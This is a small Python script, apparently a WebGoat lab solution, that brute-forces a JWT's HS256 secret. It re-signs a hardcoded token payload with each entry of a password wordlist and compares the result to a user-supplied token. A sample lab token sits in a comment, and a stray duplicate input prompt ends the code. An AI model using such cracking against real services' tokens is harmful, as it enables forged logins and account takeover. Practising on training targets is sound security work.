import jwt 
from pathlib import Path


hash = input("\033[1m Enter jwt token hash to crack : \033[0m")
file_path = Path('C:/Users/net/Desktop/SecLists/Passwords/xato-net-10-million-passwords-1000000.txt')

flag = False
count = 0
if not file_path.is_file():
    print(f"File not found : {file_path}")
else : 
    try:
        content = file_path.read_text()
        passwords = content.splitlines()
        for password in passwords:
            count += 1
            newHash =  jwt.encode({
                "iss": "WebGoat Token Builder",
                "aud": "webgoat.org",
                "iat": 1716965517,
                "exp": 1716965577,
                "sub": "tom@webgoat.org",
                "username": "Tom",
                "Email": "tom@webgoat.org",
                "Role": [
                "Manager",
                "Project Administrator"
              ]
            }, password, algorithm="HS256")
            if newHash == hash:
               print("\033[91m\033[1m Secret key found  \033[0m : ", password)
               flag = True
        if not flag:
              print(f"\033[91m\033[1m key wasnt found, try again with another wordlist, tried {count} combinations \033[0m")
    except Exception as e:
        print(f"An error occured: {e}")



hash = input("\033[1m Enter jwt token hash to crack : \033[0m")


    
    
#jwt.decode(encoded_jwt, "secret", algorithms=["HS256"])
#{'some': 'payload'}

#eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTcxNjk2NTUxNywiZXhwIjoxNzE2OTY1NTc3LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.lYb8COgG-lGh966w7xovaRfsE6thcupGfxzQCDCqqdo